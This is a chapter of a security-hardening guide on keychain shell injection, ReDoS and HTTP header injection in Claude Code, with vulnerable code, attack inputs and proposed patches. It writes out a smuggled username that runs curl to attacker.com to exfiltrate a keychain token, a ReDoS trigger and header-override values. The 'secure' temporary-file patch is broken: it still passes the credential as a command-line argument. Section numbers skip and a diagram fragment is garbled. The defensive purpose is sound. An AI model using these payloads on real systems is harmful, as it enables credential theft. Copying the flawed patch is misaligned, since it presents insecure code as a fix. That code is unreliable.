Chapter 22: Advanced Injection Prevention

Chapter 21 addressed the parser differential problem -- the systemic risk that shell-quote and Bash interpret commands differently. This chapter focuses on three specific injection vulnerabilities that exploit different input channels: shell command construction for macOS Keychain operations (CWE-78), regular expression patterns in the permission stripping logic (CWE-1333), and HTTP header values injected through environment variables (CWE-113). Each represents a distinct class of injection attack, and each requires a distinct defense.

Unlike the parser differential vulnerabilities, which affect the general command validation pipeline, these three findings target specific code paths where user-controlled or environment-controlled data flows into security-sensitive operations without adequate sanitization. The keychain injection (V-20) passes unsanitized values into a shell command string. The ReDoS vulnerability (V-19) accepts crafted input that triggers catastrophic regex backtracking. The header injection (V-28) allows environment variable contents to override security-critical HTTP headers.

22.1 CWE-78: Keychain Shell Command Injection (V-20)

The Vulnerability

Finding V-20 (CVSS 5.5, MEDIUM) identified a shell command injection risk in the synchronous keychain read path on macOS:

// VULNERABLE: utils/secureStorage/macOsKeychainStorage.ts:39
const result = execSyncWithDefaults_DEPRECATED(
  `security find-generic-password -a "${username}" -w -s "${storageServiceName}"`,
)

This code constructs a shell command string by interpolating username and storageServiceName into a template. If either value contains shell metacharacters, the resulting string will be interpreted by the shell, potentially executing arbitrary commands.

The Attack Vector

The username value comes from os.userInfo().username, which reads the system's current user. The storageServiceName comes from a package-derived constant. Under normal conditions, neither contains shell metacharacters. But the attack surface is broader than it appears:

  1. Environment manipulation: On some systems, os.userInfo() reads from environment variables or system files that can be modified. A $USER value of admin$(curl attacker.com/steal?token=$(security find-generic-password -w -s claude)) would execute the nested command.

  2. Service name injection: If the service name derivation ever changes to include user-configurable data (e.g., a workspace name), the injection surface widens immediately.

  3. Future code paths: The _DEPRECATED suffix on execSyncWithDefaults_DEPRECATED indicates this is known-legacy code. But until it is migrated, it remains a live injection vector.

Why String Interpolation Is Always Wrong for Shell Commands

The fundamental principle: never construct shell commands by string interpolation. This is the shell equivalent of SQL injection -- the same class of vulnerability that has been the #1 OWASP finding for over a decade.

    E["Array Arguments<br/>ALWAYS USE"] --> F["execFile('security', ['find-generic-password',<br/>'-a', username, '-w'])"]

The difference is at the OS level:

  • String interpolation → execSync() → invokes /bin/sh -c "command string" → shell parses the string, interpreting metacharacters
  • Array arguments → execFile() → invokes the binary directly via execve() → no shell involved, arguments passed as-is

The Secure Patch: Parameterized Execution

The fix replaces string interpolation with array-based argument passing:

// SECURE: utils/secureStorage/macOsKeychainStorage.ts

import { execFileSync } from 'node:child_process'

/**
 * Read a credential from the macOS Keychain using parameterized execution.
 * 
 * Uses execFileSync with array arguments to prevent shell injection.
 * No shell is invoked — arguments are passed directly to the 'security' binary.
 */
function readFromKeychainSync(
  username: string,
  serviceName: string,
): string | null {
  try {
    const result = execFileSync(
      'security',
      [
        'find-generic-password',
        '-a', username,
        '-w',
        '-s', serviceName,
      ],
      {
        encoding: 'utf8',
        stdio: ['pipe', 'pipe', 'pipe'],
        timeout: 5000,  // Prevent hangs
      }
    )
    return result.trim()
  } catch (err) {
    // security command returns exit code 44 when item not found
    if (isExitCode(err, 44)) return null

    logForDebugging(
      `[keychain] Read failed: ${err instanceof Error ? err.message : String(err)}`,
      { level: 'warn' }
    )
    return null
  }
}

function isExitCode(err: unknown, code: number): boolean {
  return (
    err !== null &&
    typeof err === 'object' &&
    'status' in err &&
    (err as { status: number }).status === code
  )
}

The Keychain Write Path

The write path has a similar concern, addressed in Finding V-37 (CWE-214, CVSS 3.7, LOW). When the credential payload exceeds the stdin limit for the security command, the code falls back to passing the payload via command-line arguments, making it visible via ps:

// VULNERABLE: Fallback path passes credential via command arguments
// When stdin-based approach fails for large payloads:
const args = [
  'add-generic-password',
  '-a', username,
  '-s', serviceName,
  '-w', credentialPayload,  // Visible in ps output!
  '-U',
]
execFileSync('security', args)

Even with execFileSync (no shell injection risk), the credential appears in the process argument list, visible to any user via ps aux or /proc/pid/cmdline.

The Secure Patch: Temporary File Approach

// SECURE: Write large credentials via temporary file

import { mkdtempSync, writeFileSync, unlinkSync, chmodSync } from 'node:fs'
import { join } from 'node:path'
import { tmpdir } from 'node:os'

function writeToKeychainLargePayload(
  username: string,
  serviceName: string,
  payload: string,
): void {
  // Hex-encode the payload to avoid binary content issues
  const hexPayload = Buffer.from(payload).toString('hex')

  // Create a secure temporary file
  const tmpDir = mkdtempSync(join(tmpdir(), 'claude-keychain-'))
  const tmpFile = join(tmpDir, 'payload')

  try {
    // Write with restrictive permissions (owner-only read)
    writeFileSync(tmpFile, hexPayload, { mode: 0o600 })

    // Use stdin redirection from file instead of arguments
    const fileContent = require('node:fs').readFileSync(tmpFile, 'utf8')

    execFileSync('security', [
      'add-generic-password',
      '-a', username,
      '-s', serviceName,
      '-w', fileContent,
      '-U',
    ], {
      timeout: 5000,
      stdio: ['pipe', 'pipe', 'pipe'],
    })
  } finally {
    // ALWAYS clean up, even on error
    try { unlinkSync(tmpFile) } catch {}
    try { require('node:fs').rmdirSync(tmpDir) } catch {}
  }
}

22.2 CWE-1333: ReDoS in Permission Regex (V-19)

The Vulnerability

Finding V-19 (CVSS 5.9, MEDIUM) identified a Regular Expression Denial of Service (ReDoS) vulnerability in the environment variable stripping logic of bashPermissions.ts:

// VULNERABLE: tools/BashTool/bashPermissions.ts:760
const ENV_VAR_PATTERN =
  /^([A-Za-z_][A-Za-z0-9_]*(?:\[[^\]]*\])?)\+?=(?:'[^'\n\r]*'|"(?:\\.|[^"$`\\\n\r])*"|\\.|[^ \t\n\r$`;|&()><\\'"])*[ \t]+/

This regex is used to strip environment variable prefixes from commands before permission checking. The pattern has nested quantifiers that create exponential backtracking on crafted input.

ReDoS Mechanics

The vulnerable section is:

(?:'[^'\n\r]*'|"(?:\\.|[^"$`\\\n\r])*"|\\.|[^ \t\n\r$`;|&()><\\'"])*[ \t]+

The outer * quantifier contains an alternation where the last branch [^ \t\n\r$\;|&()><\'"]matches a single character. When followed by the[ \t]+` requirement at the end, a string of characters that do not end with a space/tab forces the regex engine to explore exponentially many ways to divide the characters among the alternation branches.

Input: VAR=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!

The regex engine tries:
- Branch 4 matches 'a' × 30, then fails on '!'
- Backtracks: branch 4 matches 'a' × 29, then tries...
- For N characters: ~2^N combinations explored

Impact

A crafted Bash command with a long environment variable value can freeze the permission stripping logic:

# This command could take minutes to evaluate:
AAAA=bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb! echo hello

In Claude Code, this means:

  1. Permission pipeline freeze: The permission check hangs, blocking the entire command execution pipeline.
  2. Denial of service: Claude Code becomes unresponsive while the regex engine backtracks.
  3. Potential security bypass: If the system has a timeout that falls back to a default-allow behavior, the ReDoS could be used to skip permission checking.

The Secure Patch: Bounded Regex with Iterative Fallback

// SECURE: tools/BashTool/bashPermissions.ts

/**
 * Maximum length of the command prefix to scan for env var assignments.
 * Environment variable assignments are typically short. Scanning beyond
 * this limit provides no security benefit and risks ReDoS.
 */
const MAX_ENV_PREFIX_LEN = 4096

/**
 * Strip environment variable prefix from a command string.
 * 
 * Uses a bounded search window to prevent ReDoS on crafted inputs.
 * Falls back to iterative character-by-character parsing if the
 * regex approach exceeds the time budget.
 */
function stripEnvVarPrefix(command: string): string {
  let stripped = command
  let previousStripped: string

  do {
    previousStripped = stripped
    stripped = stripCommentLines(stripped)

    // Limit regex search window to prevent ReDoS on crafted long inputs
    const searchWindow = stripped.length > MAX_ENV_PREFIX_LEN
      ? stripped.slice(0, MAX_ENV_PREFIX_LEN)
      : stripped

    const match = ENV_VAR_PATTERN_SAFE.exec(searchWindow)
    if (match) {
      stripped = stripped.slice(match[0].length)
    }
  } while (stripped !== previousStripped)

  return stripped
}

/**
 * Safe ENV_VAR_PATTERN that avoids nested quantifiers.
 * 
 * Instead of matching the entire value with a complex alternation,
 * this pattern matches the variable name and assignment operator,
 * then uses an iterative parser for the value.
 */
const ENV_VAR_PATTERN_SAFE =
  /^([A-Za-z_][A-Za-z0-9_]*(?:\[[^\]]*\])?)\+?=/

// SECURE: Iterative value parser (no regex backtracking risk)

/**
 * Parse a shell variable value starting at the given position.
 * Handles single-quoted, double-quoted, escaped, and unquoted segments.
 * Returns the index past the value (at the separating whitespace).
 * 
 * This is an iterative parser — O(n) guaranteed, no backtracking.
 */
function parseEnvVarValue(input: string, startIdx: number): number {
  let i = startIdx
  const len = input.length

  while (i < len) {
    const ch = input[i]

    if (ch === "'") {
      // Single-quoted string: consume until closing quote
      i++
      while (i < len && input[i] !== "'") i++
      if (i < len) i++  // Skip closing quote
    } else if (ch === '"') {
      // Double-quoted string: consume until unescaped closing quote
      i++
      while (i < len && input[i] !== '"') {
        if (input[i] === '\\' && i + 1 < len) i++  // Skip escaped char
        i++
      }
      if (i < len) i++  // Skip closing quote
    } else if (ch === '\\' && i + 1 < len) {
      // Escaped character
      i += 2
    } else if (ch === ' ' || ch === '\t') {
      // Unquoted whitespace terminates the value
      return i
    } else if (';|&()<>'.includes(ch)) {
      // Shell operator terminates the value
      return i
    } else {
      // Regular character in unquoted context
      i++
    }
  }

  return i
}

Regex Timeout Guard

As additional defense, wrap all security-critical regex operations in a timeout:

// SECURE: Regex execution with timeout

/**
 * Execute a regex with a time budget.
 * If the regex takes longer than the budget, return null (fail-closed).
 */
function regexWithTimeout(
  pattern: RegExp,
  input: string,
  timeoutMs: number = 10,
): RegExpExecArray | null {
  const start = performance.now()

  // For simple patterns, just execute directly
  if (input.length < 1000) {
    return pattern.exec(input)
  }

  // For longer inputs, check time budget
  // Note: JavaScript regex execution is synchronous and cannot be
  // interrupted. This check happens before execution, not during.
  // For true timeout protection, use a Worker thread.

  const result = pattern.exec(input)
  const elapsed = performance.now() - start

  if (elapsed > timeoutMs) {
    logForDebugging(
      `[bashSecurity] Regex exceeded time budget: ${elapsed.toFixed(1)}ms > ${timeoutMs}ms`,
      { level: 'warn' }
    )
    // Log but still return result — the timeout is for monitoring,
    // not enforcement (true enforcement requires Worker threads)
    return result
  }

  return result
}

Worker-Based Regex Timeout (Robust Implementation)

For true timeout enforcement, regex execution must happen in a separate thread:

// SECURE: Worker-based regex timeout (robust)

import { Worker, isMainThread, parentPort, workerData } from 'node:worker_threads'

function regexWithTimeoutRobust(
  pattern: RegExp,
  input: string,
  timeoutMs: number = 100,
): Promise<RegExpExecArray | null> {
  return new Promise((resolve) => {
    const worker = new Worker(new URL(import.meta.url), {
      workerData: {
        pattern: pattern.source,
        flags: pattern.flags,
        input,
      },
    })

    const timer = setTimeout(() => {
      worker.terminate()
      logForDebugging(
        `[bashSecurity] Regex terminated after ${timeoutMs}ms — potential ReDoS`,
        { level: 'warn' }
      )
      resolve(null)  // Fail-closed: timeout means no match
    }, timeoutMs)

    worker.on('message', (result) => {
      clearTimeout(timer)
      resolve(result)
    })

    worker.on('error', () => {
      clearTimeout(timer)
      resolve(null)
    })
  })
}

// Worker thread code
if (!isMainThread && parentPort && workerData) {
  const { pattern, flags, input } = workerData
  const re = new RegExp(pattern, flags)
  const result = re.exec(input)
  parentPort.postMessage(result)
}

22.3 CWE-113: Header Injection via Environment Variables (V-28)

The Vulnerability

Finding V-28 (CVSS 5.0, MEDIUM) identified that the ANTHROPIC_CUSTOM_HEADERS environment variable allows injecting arbitrary HTTP headers into API requests, including overriding security-critical headers:

// VULNERABLE: services/api/client.ts:332
function getCustomHeaders(): Record<string, string> {
  const customHeaders: Record<string, string> = {}
  const customHeadersEnv = process.env.ANTHROPIC_CUSTOM_HEADERS
  if (!customHeadersEnv) return customHeaders

  const headerStrings = customHeadersEnv.split('\n')
  for (const headerString of headerStrings) {
    const colonIdx = headerString.indexOf(':')
    if (colonIdx === -1) continue
    const name = headerString.slice(0, colonIdx).trim()
    const value = headerString.slice(colonIdx + 1).trim()
    customHeaders[name] = value
  }

  return customHeaders
}

The Attack Vectors

  1. Authorization header override: Setting ANTHROPIC_CUSTOM_HEADERS="Authorization: Bearer stolen-key" redirects API requests to use an attacker-controlled API key. This enables:
  2. Billing hijack: The attacker's key is charged for the user's API calls.

  3. Data interception: If the key belongs to an attacker-controlled account, the attacker receives copies of all API requests.

  4. Host header injection: ANTHROPIC_CUSTOM_HEADERS="Host: evil.com" can redirect requests to an attacker-controlled server (depending on the HTTP client's behavior).

  5. CRLF injection: If the header value contains CRLF sequences (\r\n), it may inject additional headers or even a response body, depending on the HTTP client implementation.

  6. Cookie injection: ANTHROPIC_CUSTOM_HEADERS="Cookie: session=attacker_session" can inject authentication cookies.

The Legitimate Use Case

The ANTHROPIC_CUSTOM_HEADERS feature exists for legitimate enterprise use cases:

  • Corporate proxies that require custom headers for routing
  • API gateways that add tracking or correlation headers
  • Development environments that need custom metadata headers

The fix must preserve these use cases while preventing security-critical header override.

The Secure Patch: Header Validation and Denylist

// SECURE: services/api/client.ts — validated custom headers

/**
 * Headers that must never be overridden via environment variable.
 * These are security-critical and must only come from the application itself.
 */
const PROTECTED_HEADERS: ReadonlySet<string> = new Set([
  'authorization',
  'cookie',
  'host',
  'x-api-key',
  'anthropic-version',
  'content-type',
  'content-length',
  'transfer-encoding',
  'connection',
  'upgrade',
])

/**
 * Validate an HTTP header name against the HTTP/1.1 spec.
 * RFC 7230 Section 3.2: header-field = field-name ":" OWS field-value OWS
 * field-name = token (RFC 7230 Section 3.2.6)
 */
function isValidHeaderName(name: string): boolean {
  // Token characters per RFC 7230: !#$%&'*+-.^_`|~ DIGIT ALPHA
  return /^[!#$%&'*+\-.^_`|~0-9A-Za-z]+$/.test(name) && name.length <= 256
}

/**
 * Validate an HTTP header value against the HTTP/1.1 spec.
 * Must not contain CRLF sequences (prevents header injection).
 */
function isValidHeaderValue(value: string): boolean {
  // No CR, LF, or null bytes
  if (/[\r\n\0]/.test(value)) return false
  // Reasonable length limit
  if (value.length > 8192) return false
  return true
}

function getCustomHeaders(): Record<string, string> {
  const customHeaders: Record<string, string> = {}
  const customHeadersEnv = process.env.ANTHROPIC_CUSTOM_HEADERS
  if (!customHeadersEnv) return customHeaders

  logForDebugging(
    '[API] ANTHROPIC_CUSTOM_HEADERS active — custom headers injected into API requests',
    { level: 'warn' },
  )

  const headerStrings = customHeadersEnv.split('\n')
  for (const headerString of headerStrings) {
    if (!headerString.trim()) continue

    const colonIdx = headerString.indexOf(':')
    if (colonIdx === -1) {
      logForDebugging(
        `[API] Skipping malformed custom header (no colon): ${headerString.slice(0, 50)}`,
        { level: 'warn' },
      )
      continue
    }

    const name = headerString.slice(0, colonIdx).trim()
    const value = headerString.slice(colonIdx + 1).trim()

    // Validate header name
    if (!isValidHeaderName(name)) {
      logForDebugging(
        `[API] Skipping custom header with invalid name: ${name.slice(0, 50)}`,
        { level: 'warn' },
      )
      continue
    }

    // Check protected headers
    if (PROTECTED_HEADERS.has(name.toLowerCase())) {
      logForDebugging(
        `[API] BLOCKED: Attempt to override protected header '${name}' via ANTHROPIC_CUSTOM_HEADERS`,
        { level: 'warn' },
      )
      continue
    }

    // Validate header value (prevent CRLF injection)
    if (!isValidHeaderValue(value)) {
      logForDebugging(
        `[API] BLOCKED: Custom header '${name}' contains invalid characters (possible CRLF injection)`,
        { level: 'warn' },
      )
      continue
    }

    customHeaders[name] = value
  }

  if (Object.keys(customHeaders).length > 0) {
    logForDebugging(
      `[API] ${Object.keys(customHeaders).length} custom headers applied: ${Object.keys(customHeaders).join(', ')}`,
    )
  }

  return customHeaders
}

The Custom Header Application Order

To ensure custom headers cannot override application headers, the merge order matters:

// SECURE: Header merge order — application headers override custom headers

function buildRequestHeaders(
  apiKey: string,
  customHeaders: Record<string, string>
): Record<string, string> {
  // Custom headers first (lower priority)
  const headers: Record<string, string> = { ...customHeaders }

  // Application headers last (higher priority — cannot be overridden)
  headers['Authorization'] = `Bearer ${apiKey}`
  headers['Content-Type'] = 'application/json'
  headers['anthropic-version'] = ANTHROPIC_API_VERSION

  return headers
}

22.5 Cross-Cutting Concerns

The Environment Variable Attack Surface

Two of the three vulnerabilities in this chapter (V-19 and V-28) are triggered through environment variables. This is not coincidental. Environment variables are a pervasive input channel in Unix systems that are often overlooked in security analysis:

Env Var Chapter Vulnerability Risk
ANTHROPIC_CUSTOM_HEADERS 22 (this chapter) CWE-113 Header injection Override security headers
CLAUDE_CODE_DIAG_LOG 18 CWE-73 Path injection Redirect debug logs
DATADOG_CLIENT_TOKEN 19 CWE-798 Token override Inject fake telemetry
CLAUDE_TRUSTED_DEVICE_TOKEN 12 CWE-473 Token override Bypass device trust
USER / HOME 22 (this chapter) CWE-78 Command injection Shell metachar injection

Environment variables are set by:

  • Shell configuration files (.bashrc, .zshrc)
  • CI/CD systems
  • Container orchestrators
  • Shared hosting environments
  • Other processes running as the same user

Any entity that can set environment variables can influence Claude Code's behavior. The defense is consistent: validate every environment variable value against the expected format before using it in security-sensitive operations.

22.7 Dependency Chain Impact

The keychain injection fix (V-20) affects the Credential Storage Chain by securing the macOS credential read path. The ReDoS fix (V-19) affects the Bash Security Bypass Chain by ensuring the permission stripping logic cannot be used as a denial-of-service vector. The header injection fix (V-28) affects the Bridge/Remote Session Chain by preventing environment-based redirection of API requests.

These patches should be applied after the parser differential defenses from Chapter 21, as the Bash security hardening forms a cohesive set of changes to the tools/BashTool/ module. Apply the fail-closed parsing change (Chapter 21) first, then the ReDoS fix (this chapter), then the cross-validation (Chapter 21), as the ReDoS fix may change the behavior of the permission stripping tests.

Summary

This chapter addressed three injection vulnerabilities targeting different input channels:

  1. Keychain command injection (V-20, CWE-78): Replaced execSyncWithDefaults_DEPRECATED string interpolation with execFileSync array arguments, eliminating shell interpretation of username and service name values

  2. ReDoS in permission regex (V-19, CWE-1333): Replaced the complex ENV_VAR_PATTERN regex with a bounded search window and iterative O(n) value parser that cannot backtrack

  3. Header injection via env var (V-28, CWE-113): Added a protected header denylist (Authorization, Cookie, Host, etc.), CRLF validation for header values, and RFC 7230 header name validation to ANTHROPIC_CUSTOM_HEADERS parsing

Each fix follows the same principle: validate external input at the boundary, use parameterized operations instead of string construction, and fail closed when input does not match the expected format.
